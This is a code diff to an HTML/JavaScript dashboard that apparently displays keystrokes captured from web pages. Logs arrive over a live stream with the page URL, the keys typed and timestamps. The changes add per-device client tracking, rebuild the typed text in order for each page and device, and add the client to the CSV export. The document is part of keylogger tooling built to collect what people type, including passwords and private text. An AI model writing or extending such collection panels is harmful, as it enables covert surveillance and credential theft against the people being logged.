@@ -178,14 +178,19 @@
       background: #050814;
     }
     .col-id {
-      width: 60px;
+      width: 50px;
       color: var(--text-muted);
       font-size: 11px;
     }
     .col-time {
-      width: 180px;
+      width: 160px;
       font-size: 11px;
       color: #e5e7eb;
+    }
+    .col-client {
+      width: 120px;
+      font-size: 11px;
+      color: #cbd5f5;
     }
     .col-url a {
       color: var(--accent);
@@ -262,7 +267,7 @@
       <input
         id="filterInput"
         type="text"
-        placeholder="Filter by URL or keys..."
+        placeholder="Filter by URL, keys or client..."
       />
       <button id="groupToggle" class="btn">Group by URL: ON</button>
       <button id="themeToggle" class="btn">Theme: Dark</button>
@@ -278,20 +283,21 @@
         <tr>
           <th class="col-id">#</th>
           <th class="col-time">Time</th>
+          <th class="col-client">Client</th>
           <th class="col-url">Page URL</th>
-          <th class="col-keys">Keys</th>
+          <th class="col-keys">Text</th>
         </tr>
       </thead>
       <tbody id="logBody">
         <tr>
-          <td colspan="4" class="no-logs">Waiting for logs...</td>
+          <td colspan="5" class="no-logs">Waiting for logs...</td>
         </tr>
       </tbody>
     </table>
 
     <div class="footer-note">
       • Logs are kept in memory (latest 1000 entries).<br />
-      • "Group by URL" shows one row per page, combining all keys for that page.<br />
+      • "Group by URL" shows one row per page <strong>and per client</strong>, combining all keys for that page/device.<br />
       • Download CSV exports all logs currently in memory.
       <div class="centrali">MadeByCentrali</div>
     </div>
@@ -332,6 +338,7 @@
     // ---------- HELPERS ----------
     function normalizeLog(data) {
       const url = data.url || "N/A";
+      const client = data.client || "unknown";
       const keysArr = Array.isArray(data.keys)
         ? data.keys.map(k => String(k))
         : [String(data.keys ?? "")];
@@ -343,32 +350,18 @@
       return {
         id: nextId++,
         url,
+        client,
         keys: keysArr,
         timestamps: tsArr,
         time: primaryTs
       };
     }
 
-    function keyPillSpan(key) {
-      const span = document.createElement("span");
-      span.classList.add("pill");
-      if (key === " ") {
-        span.classList.add("pill-space");
-        span.textContent = "[space]";
-      } else if (/^\[.*\]$/.test(key)) {
-        span.classList.add("pill-special");
-        span.textContent = key;
-      } else {
-        span.textContent = key;
-      }
-      return span;
-    }
-	
     function formatKeysAsText(keysArr) {
       return keysArr
         .map(k => {
-          if (k === " ") return " ";                 // real space
-          const m = k.match(/^\[(.+)\]$/);           // special key like [Tab]
+          if (k === " ") return " ";
+          const m = k.match(/^\[(.+)\]$/); // [Tab], [Enter] etc.
           if (m) return " [" + m[1].toLowerCase() + "] ";
           return k;
         })
@@ -379,7 +372,8 @@
       if (!filterText) return true;
       const f = filterText.toLowerCase();
       return (
-        log.url.toLowerCase().includes(f) ||
+        (log.url && log.url.toLowerCase().includes(f)) ||
+        (log.client && log.client.toLowerCase().includes(f)) ||
         log.keys.join(" ").toLowerCase().includes(f)
       );
     }
@@ -396,7 +390,7 @@
       if (filtered.length === 0) {
         const row = document.createElement("tr");
         const cell = document.createElement("td");
-        cell.colSpan = 4;
+        cell.colSpan = 5;
         cell.className = "no-logs";
         cell.textContent = "No logs to display yet.";
         row.appendChild(cell);
@@ -419,6 +413,11 @@
           tdTime.textContent = log.time;
           tr.appendChild(tdTime);
 
+          const tdClient = document.createElement("td");
+          tdClient.className = "col-client";
+          tdClient.textContent = log.client;
+          tr.appendChild(tdClient);
+
           const tdUrl = document.createElement("td");
           tdUrl.className = "col-url";
           const a = document.createElement("a");
@@ -437,29 +436,33 @@
           logBody.appendChild(tr);
         });
       } else {
-        // --- GROUPED BY URL (combine all keys per URL) ---
-        const byUrl = new Map();
+        // --- GROUPED BY URL + CLIENT (combine all keys per URL/client) ---
+        const byKey = new Map();
         filtered.forEach(log => {
-          if (!byUrl.has(log.url)) {
-            byUrl.set(log.url, []);
+          const groupKey = `${log.url}||${log.client}`;
+          if (!byKey.has(groupKey)) {
+            byKey.set(groupKey, []);
           }
-          byUrl.get(log.url).push(log);
+          byKey.get(groupKey).push(log);
         });
 
-        const groups = Array.from(byUrl.entries()).sort((a, b) => {
+        const groups = Array.from(byKey.entries()).sort((a, b) => {
           const aTime = a[1][0].time;
           const bTime = b[1][0].time;
           return bTime.localeCompare(aTime);
         });
 
         let idx = 1;
-        groups.forEach(([url, groupLogs]) => {
-          const latest = groupLogs[0];
+        groups.forEach(([groupKey, groupLogs]) => {
+          const [url, client] = groupKey.split("||");
+          const latest = groupLogs[0];       // newest batch
           const total = groupLogs.length;
 
-          // combine all keys from all logs for this URL
+          // ✅ combine all keys from all logs for this URL+client, oldest → newest
           const combinedKeys = [];
-          groupLogs.forEach(l => combinedKeys.push(...l.keys));
+          for (let i = groupLogs.length - 1; i >= 0; i--) {
+            combinedKeys.push(...groupLogs[i].keys);
+          }
 
           const tr = document.createElement("tr");
 
@@ -479,6 +482,11 @@
             "</span>";
           tr.appendChild(tdTime);
 
+          const tdClient = document.createElement("td");
+          tdClient.className = "col-client";
+          tdClient.textContent = client;
+          tr.appendChild(tdClient);
+
           const tdUrl = document.createElement("td");
           tdUrl.className = "col-url";
           const a = document.createElement("a");
@@ -493,7 +501,6 @@
           tdKeys.className = "col-keys";
           tdKeys.textContent = formatKeysAsText(combinedKeys);
           tr.appendChild(tdKeys);
-
 
           logBody.appendChild(tr);
         });
@@ -520,11 +527,12 @@
 
     downloadBtn.addEventListener("click", () => {
       if (!logs.length) return;
-      const rows = [["id", "time", "url", "keys", "timestamps"]];
+      const rows = [["id", "time", "client", "url", "keys", "timestamps"]];
       logs.forEach(log => {
         rows.push([
           log.id,
           log.time,
+          log.client || "",
           log.url,
           log.keys.join(" "),
           (log.timestamps || []).join(" | ")
@@ -565,7 +573,7 @@
         const data = JSON.parse(event.data);
         const log = normalizeLog(data);
 
-        // newest on top
+        // newest on top in memory
         logs.unshift(log);
         if (logs.length > MAX_LOGS) {
           logs = logs.slice(0, MAX_LOGS);
